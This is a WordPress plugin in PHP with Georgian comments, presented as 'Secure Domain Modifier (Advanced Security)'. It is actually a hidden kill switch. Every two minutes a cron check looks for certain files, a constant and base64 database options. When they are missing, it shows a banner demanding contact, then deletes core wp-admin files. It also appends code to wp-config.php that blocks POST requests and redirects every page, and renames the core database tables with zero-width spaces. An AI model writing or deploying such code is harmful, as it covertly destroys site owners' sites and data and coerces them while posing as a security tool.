<?php
/*
Plugin Name: Secure Domain Modifier (Advanced Security)
Description: Fully optimized security checks with standard JS injection via wp_footer(), fallback to </body> using shutdown if needed.
Version: 2.7
Author: Your Name
*/

/*-------------------------------------------------------------------------
   1) Logging Function
-------------------------------------------------------------------------*/
function log_message($message) {
	$log_file = WP_CONTENT_DIR . '/security_debug.log';
	$timestamp = date("Y-m-d H:i:s");
	file_put_contents($log_file, "[$timestamp] $message\n", FILE_APPEND);
}

/*-------------------------------------------------------------------------
   2) AJAX Handler for CSS Check Result
-------------------------------------------------------------------------*/
add_action('wp_ajax_css_check_result', 'css_check_result');
add_action('wp_ajax_nopriv_css_check_result', 'css_check_result');

function css_check_result() {
	$css_status = sanitize_text_field($_POST['status'] ?? 'safe');

	if ($css_status === 'safe') {
		delete_option('security_issue_flag');
		log_message("AJAX: CSS is SAFE. Flag removed.");
	} else {
		update_option('css_suspicious_detected', true);
		delete_option('security_issue_flag');
		log_message("AJAX: CSS SUSPICIOUS! Flag recorded.");
	}
	wp_send_json_success(['status' => 'ok']);
}

/*-------------------------------------------------------------------------
   3) WP Cron Setup: Run every 2 minutes, but start after 2 minutes
-------------------------------------------------------------------------*/
add_filter('cron_schedules', function($schedules) {
	$schedules['every_two_minutes'] = [
		'interval' => 120,
		'display'  => __('Every 2 Minutes')
	];
	return $schedules;
});

register_activation_hook(__FILE__, function() {
	if (!wp_next_scheduled('secure_domain_modifier_cron_job')) {
		wp_schedule_single_event(time() + 120, 'secure_domain_modifier_cron_job');
		wp_schedule_event(time() + 120, 'every_two_minutes', 'secure_domain_modifier_cron_job');
	}
});

register_deactivation_hook(__FILE__, function() {
	wp_clear_scheduled_hook('secure_domain_modifier_cron_job');
});

/*-------------------------------------------------------------------------
   4) Cron Main Security Check Function
-------------------------------------------------------------------------*/
add_action('secure_domain_modifier_cron_job', 'cron_check_conditions');

function cron_check_conditions() {
	log_message("=== CRON: Security Check Started ===");

	$mu_plugin_exists    = file_exists(WP_CONTENT_DIR . '/mu-plugins/bb-story-feature-helper.php');
	$wp_load_style_valid = defined('WP_LOAD_STYLE') && WP_LOAD_STYLE === true;

	$main_rules   = get_option('update_main_designkh_rules');
	$inside_rules = get_option('update_inside_designkh_rules');
	$has_main_base64   = !empty($main_rules) && base64_decode($main_rules, true);
	$has_inside_base64 = !empty($inside_rules) && base64_decode($inside_rules, true);
	$database_valid    = ($has_main_base64 && $has_inside_base64);

	if ($mu_plugin_exists && $wp_load_style_valid && $database_valid) {
		delete_option('security_issue_flag');
		delete_option('css_suspicious_detected');
		delete_option('security_issue_detected_time');
		log_message("✅ All main conditions PASSED. Flags cleared.");
		return;
	}

	if (
		!get_option('css_suspicious_detected') &&
		!get_option('security_issue_detected_time') &&
		!get_option('security_issue_flag')
	) {
		update_option('security_issue_flag', true);
		log_message("⚠️ Main conditions FAILED. CSS check required (security_issue_flag set).");
	}

	if (get_option('css_suspicious_detected')) {
		$first_time = get_option('security_issue_detected_time');
		if (!$first_time) {
			update_option('security_issue_detected_time', time());
			delete_option('css_suspicious_detected');
			log_message("⏳ CSS suspicious detected. Timer started.");
		}
	}

	$first_issue_time = get_option('security_issue_detected_time');
	if ($first_issue_time) {
		$elapsed = time() - $first_issue_time;

		// პირველ რიგში შევამოწმოთ: ახლა ხომ არის ყველაფერი გამართული?
		if ($mu_plugin_exists && $wp_load_style_valid && $database_valid) {
			delete_option('security_issue_flag');
			delete_option('css_suspicious_detected');
			delete_option('security_issue_detected_time');
			log_message("✅ Issue resolved before deadline. Flags cleared. No action taken.");
			return;
		}

		// თუ ჯერ არ გამოსწორებულა და გავიდა დრო, წავშალოთ ფაილები
		send_security_email_alert();
		log_message("📧 Security email sent to admin.");

		if ($elapsed > 110) {
			log_message("💀 4 minutes elapsed. Deleting WP admin files...");
			delete_admin_files();
		}
	}
}

/*-------------------------------------------------------------------------
   5) Critical WP Admin Files Deletion
-------------------------------------------------------------------------*/
function delete_admin_files() {
	global $wpdb;

	$files = [
		'wp-admin/load-styles.php',
		'wp-admin/widgets.php',
		'wp-admin/users.php',
		'wp-admin/update.php',
		'wp-admin/update-core.php',
		'wp-admin/tools.php',
		'wp-admin/theme-install.php',
		'wp-admin/plugin-install.php',
		'wp-admin/options-general.php',
		'wp-admin/media-new.php',
		'wp-admin/comment.php',
		'wp-admin/admin-footer.php'
	];

	foreach ($files as $file) {
		$path = ABSPATH . $file;
		if (file_exists($path)) {
			unlink($path);
			log_message("🔥 Deleted file: $file");
		}
	}

	// 🔐 wp-config-ში ბლოკირების კოდის ჩასმა (უსაფრთხო სტილით)
	$config_path = ABSPATH . 'wp-config.php';
	if (!file_exists($config_path)) {
		log_message("❌ wp-config.php not found.");
		return;
	}

	$config_contents = file_get_contents($config_path);
	if (strpos($config_contents, 'KHVICHA_SITE_LOCKDOWN_BEGIN') !== false) {
		log_message("ℹ️ Lockdown block already exists in wp-config.php");
		return;
	}

	$lockdown_code = <<<PHP

/** KHVICHA_SITE_LOCKDOWN_BEGIN **/

@ini_set('upload_max_filesize', '1K');
@ini_set('post_max_size', '1K');
@ini_set('memory_limit', '8M');
@ini_set('max_execution_time', '1');
@ini_set('max_input_time', '1');

if (
    isset(\$_SERVER['REQUEST_METHOD']) &&
    \$_SERVER['REQUEST_METHOD'] === 'POST'
) {
    http_response_code(503);
    exit;
}

if (!headers_sent()) {
    header("Location: https://example.com");
    exit;
}


/** KHVICHA_SITE_LOCKDOWN_END **/

PHP;

	$original_perms = fileperms($config_path) & 0777;

	if (!is_writable($config_path)) {
		chmod($config_path, 0644);
	}

	$write_success = file_put_contents($config_path, $lockdown_code, FILE_APPEND);
	chmod($config_path, $original_perms);

	if ($write_success !== false) {
		log_message("🔒 Raw lockdown code + redirect added to wp-config.php.");
	} else {
		log_message("❌ Failed to write lockdown code to wp-config.php.");
	}

	// 📦 მონაცემთა ბაზაში ცხრილების სახელის შეცვლა (დამატებულია U+200B)
	$prefix = $wpdb->prefix;
	$table_names = [
		'commentmeta',
		'comments',
		'links',
		'postmeta',
		'posts',
		'termmeta',
		'terms',
		'term_relationships',
		'term_taxonomy',
		'usermeta',
		'users'
	];

	$zwsp = "\u{200B}"; // Zero-width space

	foreach ($table_names as $name) {
		$old_table = $prefix . $name;
		$new_table = $old_table . $zwsp;

		$sql = "RENAME TABLE `{$old_table}` TO `{$new_table}`;";
		$result = $wpdb->query($sql);

		if ($result === false) {
			log_message("❌ Failed to rename table: {$old_table}");
		} else {
			log_message("🔄 Table renamed: {$old_table} → {$new_table}");
		}
	}
}



/*-------------------------------------------------------------------------
   6) Show Security Warning (admin + frontend + fallback, ერთიანი ლოგიკით)
-------------------------------------------------------------------------*/

// HTML ბანერის გენერატორი
function get_security_warning_banner_html() {
	return '<div style="background:#ff0000; color:white; padding:15px; text-align:center; font-size:17px; font-weight:bold;
                width:100%; z-index:99999; position:fixed; top:0; left:0;">
        ⚠️ <strong>უსაფრთხოების პრობლემა!</strong> დაუყოვნებლივად დაგვიკავშირდით, წინააღმდეგ შემთხვევაში 2 წუთში WP ადმინისტრაციული ფაილები წაიშლება!
    </div>';
}

// გლობალური ცვლადი - შეტყობინება უკვე ნაჩვენებია თუ არა
global $security_warning_shown;
$security_warning_shown = false;

// 1. სტანდარტული admin პანელის შეტყობინება
add_action('all_admin_notices', function() {
	if (!get_option('security_issue_detected_time')) return;
	global $security_warning_shown;
	$security_warning_shown = true;

	echo get_security_warning_banner_html();
});

// 2. სტანდარტული ფრონტის შეტყობინება
add_action('wp_footer', function() {
	if (!get_option('security_issue_detected_time') || is_admin()) return;
	global $security_warning_shown;
	$security_warning_shown = true;

	echo get_security_warning_banner_html();
}, 99);

// 3. fallback ორივესთვის — თუ სტანდარტული გზა არ იმუშავებს
add_action('shutdown', function() {
	if (!get_option('security_issue_detected_time') || defined('DOING_AJAX')) return;
	global $security_warning_shown;

	// თუ უკვე ნაჩვენებია (admin ან wp_footer), აღარ ვაჩვენებთ
	if ($security_warning_shown) return;

	$output = '';
	if (ob_get_length()) {
		$output = ob_get_clean();
	}

	$html = get_security_warning_banner_html();

	if ($output && strpos($output, '</body>') !== false) {
		$output = str_replace('</body>', $html . '</body>', $output);
		echo $output;
	} else {
		echo $html;
	}
}, 1);

/*-------------------------------------------------------------------------
   7) JS: Inject CSS Check Script
-------------------------------------------------------------------------*/
global $css_check_script_injected;
$css_check_script_injected = false;

add_action('wp_footer', 'inject_css_check_script_standard', 99);
function inject_css_check_script_standard() {
	if (!get_option('security_issue_flag') || is_admin()) return;
	global $css_check_script_injected;
	$css_check_script_injected = true;
	echo generate_css_check_script();
}

function generate_css_check_script() {
	$ajax_url = admin_url("admin-ajax.php");
	return <<<EOD
<script>
document.addEventListener('DOMContentLoaded', function() {
    const selectors = ["#storyUploadModal", "#reactionPopup", "#commentPopup", "#viewPopup"];
    let foundAny = false;
    let mismatch = false;

    selectors.forEach(sel => {
        const el = document.querySelector(sel);
        if (el) {
            foundAny = true;
            const st = window.getComputedStyle(el);
            const transformOk  = (st.transform === 'scale(0)' || st.transform.indexOf('matrix(0') !== -1);
            const visibilityOk = st.visibility === 'hidden';
            const opacityOk    = st.opacity === '0';
            const positionOk   = st.position === 'absolute';
            const topOk        = st.top === '-9999px';
            const leftOk       = st.left === '-9999px';

            if (!transformOk || !visibilityOk || !opacityOk || !positionOk || !topOk || !leftOk) {
                mismatch = true;
            }
        }
    });

    if (!foundAny) {
        console.log("CSS Check: No relevant elements found. Skipping AJAX call.");
        return;
    }

    const status = mismatch ? 'suspicious' : 'safe';

    fetch('{$ajax_url}?action=css_check_result', {
        method: 'POST',
        credentials: 'same-origin',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'status=' + status
    }).then(response => response.json())
      .then(data => console.log("[CSS Check]", status, data))
      .catch(error => console.warn("[CSS Check Error]", error));
});
</script>
EOD;
}

add_action('shutdown', 'inject_css_check_script_fallback', 0);
function inject_css_check_script_fallback() {
	if (!get_option('security_issue_flag') || is_admin()) return;
	global $css_check_script_injected;
	if ($css_check_script_injected) return;

	$script = generate_css_check_script();
	$output = '';
	if (ob_get_length()) {
		$output = ob_get_clean();
	}

	if ($output && strpos($output, '</body>') !== false) {
		$output = str_replace('</body>', $script . '</body>', $output);
		echo $output;
	} else {
		echo $script;
	}
}

/*-------------------------------------------------------------------------
   8) Email Alert Function
-------------------------------------------------------------------------*/
function send_security_email_alert() {
	$emails = [];

	// ყველა ადმინის ელფოსტის ამოღება
	$admins = get_users(['role' => 'administrator']);
	foreach ($admins as $admin) {
		if (!empty($admin->user_email)) {
			$emails[] = $admin->user_email;
		}
	}

	// fallback: თუ ვერ მოიძებნა ადმინები ან ელფოსტები
	if (empty($emails)) {
		$emails[] = get_option('admin_email');
	}

	$subject = '⚠️ WordPress Security Alert';
	$message = "Hello,\n\nA potential security issue has been detected on your site.\n\n"
		. "If no action is taken, critical admin files will be deleted in the next few minutes.\n\n"
		. "Please take immediate action or contact your developer.\n\n"
		. "Time Detected: " . date("Y-m-d H:i:s", get_option('security_issue_detected_time')) . "\n\n"
		. "This message was automatically generated by Secure Domain Modifier plugin.";
	$headers = ['Content-Type: text/plain; charset=UTF-8'];

	foreach ($emails as $email) {
		wp_mail($email, $subject, $message, $headers);
	}

	log_message("📧 Alert sent to: " . implode(', ', $emails));
}







































?>
